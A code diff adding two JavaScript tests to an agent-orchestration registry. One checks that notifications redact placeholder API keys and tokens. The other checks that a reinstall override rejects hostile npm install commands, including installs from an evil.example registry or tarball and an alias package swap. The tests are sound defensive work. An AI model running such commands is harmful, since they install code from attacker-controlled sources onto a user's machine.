@@ -2510,3 +2510,53 @@ test('saveSessionAttachment stores a file under session artifacts and rejects ba
     await cleanup();
   }
 });
+
+test('notification redaction scrubs secret formats and the orca token name', async () => {
+  const { registry, cleanup } = await withIsolatedRegistry();
+  try {
+    const note = registry.enqueueNotification({
+      severity: 'error',
+      title: 'Lane failed with orca-api-token leak',
+      body: 'env ORCA_OPENAI_COMPATIBLE_API_KEY=sk-abcdef123456 and Bearer abc.def-ghi and ghp_ABCDEFGHIJKLMNOPQRST12345 and AKIAABCDEFGHIJKLMNOP',
+    });
+    assert.ok(note, 'notification enqueued');
+    const fetched = registry.getNotifications({ limit: 5 }).notifications.find((n) => n.id === note.id);
+    const blob = `${fetched.title} ${fetched.body}`;
+    assert.ok(!/sk-abcdef123456/.test(blob), 'sk- secret redacted');
+    assert.ok(!/ghp_ABCDEFGHIJKLMNOPQRST12345/.test(blob), 'github PAT redacted');
+    assert.ok(!/AKIAABCDEFGHIJKLMNOP/.test(blob), 'AWS key redacted');
+    assert.ok(!/Bearer abc\.def-ghi/.test(blob), 'bearer redacted');
+    assert.ok(/REDACTED/.test(blob), 'redaction markers present');
+    assert.ok(!/orca-api-token/i.test(blob), 'orca token name redacted');
+  } finally {
+    await cleanup();
+  }
+});
+
+test('reinstall override rejects alternate registries, alias packages, and bare URLs', async () => {
+  const { registry, cleanup } = await withIsolatedRegistry();
+  try {
+    const bad = [
+      'npm install -g codex --registry https://evil.example/',
+      'npm install -g codex https://evil.example/pkg.tgz',
+      'npm install -g @anthropic/claude-code@npm:evil-pkg',
+      'npm install -g codex --config cache=/tmp/x',
+    ];
+    for (const command of bad) {
+      const type = command.includes('claude') ? 'claude' : 'codex';
+      await assert.rejects(
+        () => registry.runExecutorCliReinstall(type, { actor: 'dashboard', approved: true, execute: false, command }),
+        (e) => e.status === 422 && /Invalid reinstall command override/.test(e.message || ''),
+        `should reject: ${command}`,
+      );
+    }
+    // A clean, allowlisted override still plans successfully (dry run).
+    const ok = await registry.runExecutorCliReinstall('codex', {
+      actor: 'dashboard', approved: true, execute: false,
+      command: 'npm install --yes -g @openai/codex',
+    });
+    assert.ok(ok, 'clean override plans');
+  } finally {
+    await cleanup();
+  }
+});
